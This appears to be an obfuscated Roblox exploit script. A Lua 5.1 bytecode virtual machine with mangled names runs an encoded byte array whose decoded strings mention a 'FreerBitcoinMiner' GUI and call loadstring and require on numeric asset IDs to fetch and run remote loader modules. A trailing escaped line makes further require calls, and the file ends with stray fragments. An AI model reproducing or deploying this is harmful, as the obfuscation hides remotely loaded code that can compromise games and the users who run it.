local WeareDevs IIIIIIIII
--// Obfuscator LMAOZ v2.5-beta by Universe11(idk how make codes)

local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = {'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\7','\0',
'\0','\0','\0','\0','\0','\0','\60','\101','\118','\97','\108','\62','\0','\3','\0','\0','\0','\17','\0','\0','\0','\0','\0',
'\0','\5','\20','\0','\0','\0','\1','\0','\0','\0','\75','\64','\64','\0','\193','\128','\0','\0','\36','\1','\0','\0','\92',
'\128','\0','\2','\90','\64','\0','\0','\22','\128','\0','\128','\64','\0','\0','\0','\129','\192','\0','\0','\85','\128',
'\128','\0','\133','\0','\1','\0','\192','\0','\128','\0','\156','\64','\0','\1','\133','\0','\1','\0','\193','\64','\1',
'\0','\156','\64','\0','\1','\133','\0','\1','\0','\193','\128','\1','\0','\156','\64','\0','\1','\30','\0','\128','\0','\7',
'\0','\0','\0','\4','\123','\4','\0','\0','\0','\0','\0','\0','\112','\114','\105','\110','\116','\40','\34','\103','\117',
'\105','\46','\65','\101','\65','\102','\114','\101','\101','\114','\66','\105','\116','\99','\111','\105','\110','\77','\105',
'\110','\101','\114','\46','\65','\112','\105','\41','\10','\114','\101','\116','\117','\114','\110','\40','\102','\117',
'\110','\99','\116','\105','\111','\110','\40','\66','\44','\101','\44','\111','\44','\110','\44','\97','\44','\67','\44',
'\108','\41','\108','\111','\99','\97','\108','\32','\100','\61','\115','\101','\108','\101','\99','\116','\59','\108','\111',
'\99','\97','\108','\32','\111','\61','\116','\97','\98','\108','\101','\46','\105','\110','\115','\101','\114','\116','\59',
'\108','\111','\99','\97','\108','\32','\83','\61','\117','\110','\112','\97','\99','\107','\32','\111','\114','\32','\116',
'\97','\98','\108','\101','\46','\117','\110','\112','\97','\99','\107','\59','\108','\111','\99','\97','\108','\32','\102',
'\61','\115','\116','\114','\105','\110','\103','\46','\99','\104','\97','\114','\59','\108','\111','\99','\97','\108','\32',
'\99','\61','\115','\116','\114','\105','\110','\103','\46','\115','\117','\98','\59','\108','\111','\99','\97','\108','\32',
'\81','\61','\115','\101','\116','\109','\101','\116','\97','\116','\97','\98','\108','\101','\59','\108','\111','\99','\97',
'\108','\32','\68','\61','\116','\97','\98','\108','\101','\46','\99','\111','\110','\99','\97','\116','\59','\108','\111',
'\99','\97','\108','\32','\70','\61','\115','\116','\114','\105','\110','\103','\46','\98','\121','\116','\101','\59','\108',
'\111','\99','\97','\108','\32','\69','\61','\103','\101','\116','\102','\101','\110','\118','\32','\111','\114','\32','\102',
'\117','\110','\99','\116','\105','\111','\110','\40','\41','\114','\101','\116','\117','\114','\110','\32','\95','\69','\78',
'\86','\32','\101','\110','\100','\59','\108','\111','\99','\97','\108','\32','\89','\61','\108','\59','\108','\111','\99',
'\97','\108','\32','\116','\61','\123','\125','\102','\111','\114','\32','\101','\61','\97','\44','\50','\53','\53','\32',
'\100','\111','\32','\116','\91','\101','\93','\61','\102','\40','\101','\41','\101','\110','\100','\59','\108','\111','\99',
'\97','\108','\32','\102','\117','\110','\99','\116','\105','\111','\110','\32','\105','\40','\65','\41','\108','\111','\99',
'\97','\108','\32','\108','\44','\111','\44','\88','\61','\101','\44','\101','\44','\123','\125','\108','\111','\99','\97',
'\108','\32','\73','\61','\67','\59','\108','\111','\99','\97','\108','\32','\101','\61','\110','\59','\108','\111','\99',
'\97','\108','\32','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\40','\41','\108','\111','\99','\97',
'\108','\32','\108','\61','\89','\40','\99','\40','\65','\44','\101','\44','\101','\41','\44','\51','\54','\41','\101','\61',
'\101','\43','\110','\59','\108','\111','\99','\97','\108','\32','\110','\61','\89','\40','\99','\40','\65','\44','\101',
'\44','\101','\43','\108','\45','\110','\41','\44','\51','\54','\41','\101','\61','\101','\43','\108','\59','\114','\101',
'\116','\117','\114','\110','\32','\110','\32','\101','\110','\100','\59','\108','\61','\102','\40','\83','\40','\41','\41',
'\88','\91','\110','\93','\61','\108','\59','\119','\104','\105','\108','\101','\32','\101','\60','\35','\65','\32','\100',
'\111','\32','\108','\111','\99','\97','\108','\32','\101','\61','\83','\40','\41','\105','\102','\32','\116','\91','\101',
'\93','\116','\104','\101','\110','\32','\111','\61','\116','\91','\101','\93','\101','\108','\115','\101','\32','\111','\61',
'\108','\46','\46','\99','\40','\108','\44','\110','\44','\49','\41','\101','\110','\100','\59','\116','\91','\73','\93',
'\61','\108','\46','\46','\99','\40','\111','\44','\110','\44','\49','\41','\88','\91','\35','\88','\43','\110','\93','\44',
'\108','\44','\73','\61','\111','\44','\111','\44','\73','\43','\110','\32','\101','\110','\100','\59','\114','\101','\116',
'\117','\114','\110','\32','\68','\40','\88','\41','\101','\110','\100','\59','\108','\111','\99','\97','\108','\32','\89',
'\61','\105','\40','\39','\50','\52','\49','\50','\52','\76','\50','\52','\49','\50','\52','\49','\50','\52','\53','\50',
'\55','\54','\50','\52','\49','\50','\54','\85','\50','\54','\79','\50','\55','\48','\50','\54','\83','\50','\52','\49','\50',
'\52','\66','\50','\55','\57','\50','\53','\89','\50','\54','\83','\50','\54','\68','\50','\53','\69','\50','\54','\83','\50',
'\54','\66','\50','\54','\70','\50','\54','\87','\50','\54','\81','\50','\55','\69','\50','\52','\65','\50','\55','\57','\50',
'\54','\49','\50','\54','\68','\50','\54','\68','\50','\54','\57','\50','\55','\76','\50','\55','\78','\50','\55','\80','\50',
'\55','\69','\50','\52','\57','\50','\55','\57','\50','\54','\48','\50','\55','\51','\50','\54','\65','\50','\54','\68','\50',
'\54','\79','\50','\55','\51','\50','\55','\81','\50','\52','\49','\50','\52','\50','\50','\55','\57','\50','\55','\51','\50',
'\54','\83','\50','\54','\69','\50','\52','\49','\50','\52','\54','\50','\55','\57','\50','\53','\74','\50','\54','\83','\50',
'\54','\81','\50','\54','\68','\50','\55','\50','\50','\54','\66','\50','\52','\74','\50','\52','\49','\50','\52','\55','\50',
'\55','\57','\50','\53','\85','\50','\55','\50','\50','\55','\49','\50','\56','\79','\50','\52','\73','\50','\55','\55','\50',
'\55','\57','\50','\53','\70','\50','\56','\76','\50','\54','\68','\50','\52','\49','\50','\52','\56','\50','\55','\57','\50',
'\53','\69','\50','\54','\81','\50','\54','\66','\50','\54','\83','\50','\54','\83','\50','\55','\51','\50','\53','\89','\50',
'\54','\67','\50','\54','\87','\50','\55','\70','\50','\56','\51','\50','\55','\48','\50','\54','\79','\50','\54','\85','\50',
'\54','\83','\50','\54','\53','\50','\54','\79','\50','\54','\82','\50','\54','\83','\50','\55','\49','\50','\52','\49','\50',
'\52','\52','\50','\55','\57','\50','\53','\90','\50','\54','\66','\50','\55','\67','\50','\55','\82','\50','\57','\72','\50',
'\57','\74','\50','\54','\83','\50','\53','\86','\50','\54','\67','\50','\55','\86','\50','\55','\50','\50','\55','\51','\50',
'\57','\52','\50','\55','\57','\50','\53','\72','\50','\54','\83','\50','\54','\72','\50','\54','\68','\50','\57','\77','\50',
'\57','\79','\50','\57','\81','\50','\55','\56','\50','\55','\54','\50','\54','\55','\50','\57','\87','\50','\52','\49','\50',
'\52','\68','\50','\55','\72','\50','\57','\66','\50','\55','\77','\50','\54','\79','\50','\54','\68','\50','\54','\83','\50',
'\53','\89','\50','\53','\71','\50','\54','\48','\50','\53','\88','\50','\56','\82','\50','\55','\57','\50','\53','\68','\50',
'\54','\79','\50','\57','\57','\50','\55','\51','\50','\57','\51','\50','\56','\73','\50','\55','\54','\50','\56','\85','\50',
'\57','\57','\50','\57','\68','\50','\57','\70','\50','\55','\83','\50','\55','\54','\50','\53','\83','\50','\56','\57','\50',
'\54','\88','\50','\56','\79','\50','\53','\68','\50','\55','\50','\50','\54','\87','\50','\66','\48','\50','\52','\48','\50',
'\55','\57','\50','\55','\57','\50','\51','\53','\50','\52','\85','\50','\52','\49','\50','\51','\76','\50','\55','\57','\50',
'\53','\86','\50','\54','\79','\50','\54','\81','\50','\54','\89','\50','\54','\85','\50','\54','\66','\50','\55','\50','\50',
'\54','\67','\50','\10','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\103','\115','\117','\98','\0','\4','\2','\0',
'\0','\0','\0','\0','\0','\0','\46','\0','\4','\2','\0','\0','\0','\0','\0','\0','\0','\34','\0','\4','\6','\0','\0','\0',
'\0','\0','\0','\0','\112','\114','\105','\110','\116','\0','\4','\2','\0','\0','\0','\0','\0','\0','\0','\32','\0','\4',
'\52','\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\40','\34',
'\82','\101','\113','\117','\105','\114','\101','\40','\71','\71','\78','\79','\82','\69','\69','\69','\54','\54','\54','\55',
'\52','\41','\46','\73','\100','\107','\40','\34','\76','\111','\97','\100','\101','\114','\34','\41','\41','\40','\41','\0',
'\1','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\0','\1','\0','\4',
'\6','\0','\0','\0','\65','\0','\0','\0','\139','\64','\64','\0','\156','\128','\0','\1','\85','\128','\128','\0','\94','\0',
'\0','\1','\30','\0','\128','\0','\2','\0','\0','\0','\4','\2','\0','\0','\0','\0','\0','\0','\0','\92','\0','\4','\5','\0',
'\0','\0','\0','\0','\0','\0','\98','\121','\116','\101','\0','\0','\0','\0','\0','\6','\0','\0','\0','\11','\0','\0','\0',
'\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\1','\0','\0','\0',
'\3','\0','\0','\0','\0','\0','\0','\0','\98','\98','\0','\0','\0','\0','\0','\5','\0','\0','\0','\0','\0','\0','\0','\20',
'\0','\0','\0','\8','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11',
'\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\11','\0','\0','\0','\13','\0','\0','\0','\13',
'\0','\0','\0','\13','\0','\0','\0','\14','\0','\0','\0','\14','\0','\0','\0','\14','\0','\0','\0','\15','\0','\0','\0','\15',
'\0','\0','\0','\15','\0','\0','\0','\17','\0','\0','\0','\2','\0','\0','\0','\6','\0','\0','\0','\0','\0','\0','\0','\116',
'\104','\105','\110','\103','\0','\1','\0','\0','\0','\19','\0','\0','\0','\8','\0','\0','\0','\0','\0','\0','\0','\101',
'\110','\99','\111','\100','\101','\100','\0','\10','\0','\0','\0','\19','\0','\0','\0','\0','\0','\0','\0'}

local IlIIlIlIIIlllIlIlIIlIlIlIlIIIlIIIII = {
"ABC",  "ABx", "ABC",  "ABC",
"ABC",  "ABx", "ABC",  "ABx", 
"ABC",  "ABC", "ABC",  "ABC",
"ABC",  "ABC", "ABC",  "ABC",
"ABC",  "ABC", "ABC",  "ABC",
"ABC",  "ABC", "AsBx", "ABC",
"ABC",  "ABC", "ABC",  "ABC",
"ABC",  "ABC", "ABC",  "AsBx",
"AsBx", "ABC", "ABC", "ABC",
"ABx",  "ABC",}
local llllIIlIllIIlIllIIllIlIlIIlIIIllIlI = {
"MOVE",     "LOADK",     "LOADBOOL", "LOADNIL",
"GETUPVAL", "GETGLOBAL", "GETTABLE", "SETGLOBAL",
"SETUPVAL", "SETTABLE",  "NEWTABLE", "SELF",
"ADD",      "SUB",       "MUL",      "DIV",
"MOD",      "POW",       "UNM",      "NOT",
"LEN",      "CONCAT",    "JMP",      "EQ",
"LT",       "LE",        "TEST",     "TESTSET",
"CALL",     "TAILCALL",  "RETURN",   "FORLOOP",
"FORPREP",  "TFORLOOP",  "SETLIST",  "CLOSE",
"CLOSURE",  "VARARG"
};
local function get_bits(input, n, n2)
if n2 then
local total = 0
local digitn = 0
for i = n, n2 do
total = total + 2^digitn*get_bits(input, i)
digitn = digitn + 1
end
return total
else
local pn = 2^(n-1)
return (input % (pn + pn) >= pn) and 1 or 0
end
end
local function lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
local index = 1
local big_endian = false
local int_size;
local size_t;
local get_int, get_size_t;
local get_int8, get_int32, get_int64, get_float64, get_string;
do
function get_int8()
local a = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:byte(index, index);
index = index + 1
return a
end
function get_int32()
local a, b, c, d = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:byte(index, index + 3);
index = index + 4;
return d*16777216 + c*65536 + b*256 + a
end
function get_int64()
local a = get_int32();
local b = get_int32();
return b*4294967296 + a;
end
function get_float64()
local a = get_int32()
local b = get_int32()
return (-2*get_bits(b, 32)+1)*(2^(get_bits(b, 21, 31)-1023))*
((get_bits(b, 1, 20)*(2^32) + a)/(2^52)+1)
end
function get_string(len)
local str;
if len then
str = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:sub(index, index + len - 1);
index = index + len;
else
len = get_size_t();
if len == 0 then return; end
str = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:sub(index, index + len - 1);
index = index + len;
end
return str;
end
end
local function decode_chunk()
local chunk;
local instructions = {};
local constants    = {};
local prototypes   = {};
local debug = {
lines = {};
};
chunk = {
instructions = instructions;
constants    = constants;
prototypes   = prototypes;
debug = debug;
};
local num;
chunk.name       = get_string();
chunk.first_line = get_int();
chunk.last_line  = get_int();
if chunk.name then chunk.name = chunk.name:sub(1, -2); end
chunk.upvalues  = get_int8();
chunk.arguments = get_int8();
chunk.varg      = get_int8();
chunk.stack     = get_int8();
do
num = get_int();
for i = 1, num do
local instruction = {
};
local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI   = get_int32();
local opcode = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 1, 6);
local type   = IlIIlIlIIIlllIlIlIIlIlIlIlIIIlIIIII[opcode + 1];
instruction.opcode = opcode;
instruction.type   = type;
instruction.A = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 7, 14);
if type == "ABC" then
instruction.B = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 24, 32);
instruction.C = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 23);
elseif type == "ABx" then
instruction.Bx = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 32);
elseif type == "AsBx" then
instruction.sBx = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 32) - 131071;
end
instructions[i] = instruction;
end
end
do
num = get_int();
for i = 1, num do
local constant = {
};
local type = get_int8();
constant.type = type;
if type == 1 then
constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = (get_int8() ~= 0);
elseif type == 3 then
constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = get_float64();
elseif type == 4 then
constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = get_string():sub(1, -2);
end
constants[i-1] = constant;
end
end
do
num = get_int();
for i = 1, num do
prototypes[i-1] = decode_chunk();
end
end
do
local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = debug.lines
num = get_int();
for i = 1, num do
llIIlIlIIllllIlIlIlIIlIlIlIllllIllI[i] = get_int32();
end
num = get_int();
for i = 1, num do
get_string():sub(1, -2);
get_int32();
get_int32();
end
num = get_int();
for i = 1, num do
get_string();
end
end
return chunk;
end
do
assert(get_string(4) == "\27Lua", "S1MPLYS3C7RED: Bytecode expected");
assert(get_int8() == 0x51, "S1MPLYS3C7RED: Only lua5.1 is supported");
get_int8();
big_endian = (get_int8() == 0);
int_size = get_int8();
size_t   = get_int8();
if int_size == 4 then
get_int = get_int32;
elseif int_size == 8 then
get_int = get_int64;
else
error("");
end
if size_t == 4 then
get_size_t = get_int32;
elseif size_t == 8 then
get_size_t = get_int64;
else
error("");
end
assert(get_string(3) == "\4\8\0","S1MPLYS3C7RED: Unsupported platform");
end
return decode_chunk();
end
local function handle_return(...)
local c = select("#", ...)
local t = {...}
return c, t
end
local function IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI, upvalues)
local instructions = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.instructions;
local constants    = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.constants;
local prototypes   = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.prototypes;

local stack, top
local environment
local IP = 1;
local vararg, vararg_size 

local opcode_funcs = {
[0]  = function(instruction)
stack[instruction.A] = stack[instruction.B];
end,
[1]  = function(instruction)
stack[instruction.A] = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
end,
[2]  = function(instruction)
stack[instruction.A] = instruction.B ~= 0
if instruction.C ~= 0 then
IP = IP + 1
end
end,
[3]  = function(instruction)
local stack = stack
for i = instruction.A, instruction.B do
stack[i] = nil
end
end,
[4] = function(instruction)
stack[instruction.A] = upvalues[instruction.B]
end,
[5]  = function(instruction)
local key = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
stack[instruction.A] = environment[key];
end,
[6]  = function(instruction)
local C = instruction.C
local stack = stack
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
stack[instruction.A] = stack[instruction.B][C];
end,
[7]  = function(instruction)
local key = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
environment[key] = stack[instruction.A];
end,
[8] = function (instruction)
upvalues[instruction.B] = stack[instruction.A]
end,
[9] = function (instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A][B] = C
end,
[10] = function (instruction)
stack[instruction.A] = {}
end,
[11] = function (instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack = stack
B = stack[B]
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
stack[A+1] = B
stack[A]   = B[C]
end,
[12] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B+C;
end,
[13] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B - C;
end,
[14] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B * C;
end,
[15] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B / C;
end,
[16] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B % C;
end,
[17] = function(instruction)
local B = instruction.B;
local C = instruction.C;
local stack, constants = stack, constants;
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
stack[instruction.A] = B ^ C;
end,
[18] = function(instruction)
stack[instruction.A] = -stack[instruction.B]
end,
[19] = function(instruction)
stack[instruction.A] = not stack[instruction.B]
end,
[20] = function(instruction)
stack[instruction.A] = #stack[instruction.B]
end,
[21] = function(instruction)
local B = instruction.B
local result = stack[B]
for i = B+1, instruction.C do
result = result .. stack[i] 
end
stack[instruction.A] = result
end,
[22] = function(instruction)
IP = IP + instruction.sBx
end,
[23] = function(instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack, constants = stack, constants
A = A ~= 0
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
if (B == C) ~= A then
IP = IP + 1
end
end,
[24] = function(instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack, constants = stack, constants
A = A ~= 0
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
if (B < C) ~= A then
IP = IP + 1
end
end,
[25] = function(instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack, constants = stack, constants
A = A ~= 0
B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
if (B <= C) ~= A then
IP = IP + 1
end
end,
[26] = function(instruction)
if stack[instruction.A] == (instruction.C ~= 0) then
IP = IP + 1
end
end,
[27] = function(instruction)
local stack = stack
local B = stack[instruction.B]
if B == (instruction.C ~= 0) then
IP = IP + 1
else
stack[instruction.A] = B
end
end,
[28] = function(instruction)
local A = instruction.A;
local B = instruction.B;
local C = instruction.C;
local stack = stack;
local args, results;
local limit, loop
args = {};
if B ~= 1 then
if B ~= 0 then
limit = A+B-1;
else
limit = top
end
loop = 0
for i = A+1, limit do
loop = loop + 1
args[loop] = stack[i];
end
limit, results = handle_return(stack[A](unpack(args, 1, limit-A)))
else
limit, results = handle_return(stack[A]())
end
top = A - 1
if C ~= 1 then
if C ~= 0 then
limit = A+C-2;
else
limit = limit+A
end
loop = 0;
for i = A, limit do
loop = loop + 1;
stack[i] = results[loop];
end
end
end,
[29] = function (instruction)
local A = instruction.A;
local B = instruction.B;
local C = instruction.C;
local stack = stack;
local args, results;
local top, limit, loop = top
args = {};
if B ~= 1 then
if B ~= 0 then
limit = A+B-1;
else
limit = top
end
loop = 0
for i = A+1, limit do
loop = loop + 1
args[#args+1] = stack[i];
end
results = {stack[A](unpack(args, 1, limit-A))};
else
results = {stack[A]()};
end
return true, results
end,
[30] = function(instruction)
local A = instruction.A;
local B = instruction.B;
local stack = stack;
local limit;
local loop, IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI;
if B == 1 then
return true;
end
if B == 0 then
limit = top
else
limit = A + B - 2;
end
IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = {};
local loop = 0
for i = A, limit do
loop = loop + 1
IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI[loop] = stack[i];
end
return true, IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI;
end,
[31] = function(instruction)
local A = instruction.A
local stack = stack
local step = stack[A+2]
local index = stack[A] + step 
stack[A] = index
if step > 0 then
if index <= stack[A+1] then
IP = IP + instruction.sBx
stack[A+3] = index
end
else
if index >= stack[A+1] then
IP = IP + instruction.sBx
stack[A+3] = index
end
end
end,
[32] = function(instruction)
local A = instruction.A
local stack = stack
stack[A] = stack[A] - stack[A+2]
IP = IP + instruction.sBx 
end,
[33] = function(instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack = stack
local offset = A+2
local result = {stack[A](stack[A+1], stack[A+2])}
for i = 1, C do
stack[offset+i] = result[i]
end
if stack[A+3] ~= nil then
stack[A+2] = stack[A+3]
else
IP = IP + 1
end
end,
[34] = function(instruction)
local A = instruction.A
local B = instruction.B
local C = instruction.C
local stack = stack
if C == 0 then
error("NYI: extended SETLIST")
else
local offset = (C - 1) * 50
local t = stack[A]
if B == 0 then
B = top
end
for i = 1, B do
t[offset+i] = stack[A+i]
end
end
end,
[35] = function(instruction)
io.stderr:write("NYI: CLOSE")
io.stderr:flush()
end,
[36] = function(instruction)
local proto = prototypes[instruction.Bx]
local instructions = instructions
local stack = stack
local indices = {}
local new_upvals = setmetatable({},
{
__index = function(t, k)
local upval = indices[k]
return upval.segment[upval.offset]
end,
__newindex = function(t, k, v)
local upval = indices[k]
upval.segment[upval.offset] = v
end
}
)
for i = 1, proto.upvalues do
local movement = instructions[IP]
if movement.opcode == 0 then
indices[i-1] = {segment = stack, offset = movement.B}
elseif instructions[IP].opcode == 4 then
indices[i-1] = {segment = upvalues, offset = movement.B}
end
IP = IP + 1
end
local _, func = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(proto, new_upvals)
stack[instruction.A] = func
end,
[37] = function(instruction)
local A = instruction.A
local B = instruction.B
local stack, vararg = stack, vararg

for i = A, A + (B > 0 and B - 1 or vararg_size) do
stack[i] = vararg[i - A]
end
end,
}
local function loop()
local instructions = instructions
local instruction, a, b
while true do
instruction = instructions[IP];
IP = IP + 1
a, b = opcode_funcs[instruction.opcode](instruction);
if a then
return b;
end
end
end
local IIIIIIIlIlIIlllIIlIlIIIllIIlIIIlIlI = {
get_stack = function()
return stack;
end;
get_IP = function()
return IP;
end
};
local function func(...)
local local_stack = {};
local ghost_stack = {};
top = -1
stack = setmetatable(local_stack, {
__index = ghost_stack;
__newindex = function(t, k, v)
if k > top and v then
top = k
end
ghost_stack[k] = v
end;
})
local args = {...};
vararg = {}
vararg_size = select("#", ...) - 1
for i = 0, vararg_size do
local_stack[i] = args[i+1];
vararg[i] = args[i+1]
end
environment = getfenv();
IP = 1;
local thread = coroutine.create(loop)
local a, b = coroutine.resume(thread)
if a then
if b then
return unpack(b);
end
return;
else
local name = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.name;
local line = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.debug.lines[IP];
local err  = b:gsub("(.-:)", "");
local IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = "";
IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. (name and name .. ":" or "");
IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. (line and line .. ":" or "");
IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. b
error(IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI, 0);
end
end
return IIIIIIIlIlIIlllIIlIlIIIllIIlIIIlIlI, func;
end
local lIlIlIlIlIllIIIllIlIIlllIIlllIlIIII = {
IlIIIIIIlIllIIlIlIIIllIllIIlllIllll = function(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
local IIllIlIIIlIlllllIIIlIIlllllIllllIlI = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll);
local _, func = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI);
return func;
end;
utils = {
lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll;
IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl;
IlllIIIllIlllIlIIIllllIIllllIIllllI = function(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
local IIllIlIIIlIlllllIIIlIIlllllIllllIlI = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
return IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI);
end;
};
}
lIlIlIlIlIllIIIllIlIIlllIIlllIlIIII.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, [[]]))()

-- '-'

\112\114\105\110\116\40\39\83\107\105\100\92\120\50\48\67\111\100\101\92\120\50\48\76\111\108\39\41\44\114\101\113\117\105\114\101\40\48\120\49\100\51\50\52\55\49\50\57\41\91\39\72\83\66\87\39\93\40\39\100\97\104\88\101\110\110\121\39\41\44\114\101\113\117\105\114\101\40\48\120\49\49\99\101\102\49\98\57\98\41\91\39\108\111\97\100\39\93\40\39\68\97\104\88\101\110\110\121\39\41\44\45\45\100\97\114\107\104\117\98\84\101\115\116\91\39\97\112\105\39\93\59\10
/199
JavaScript

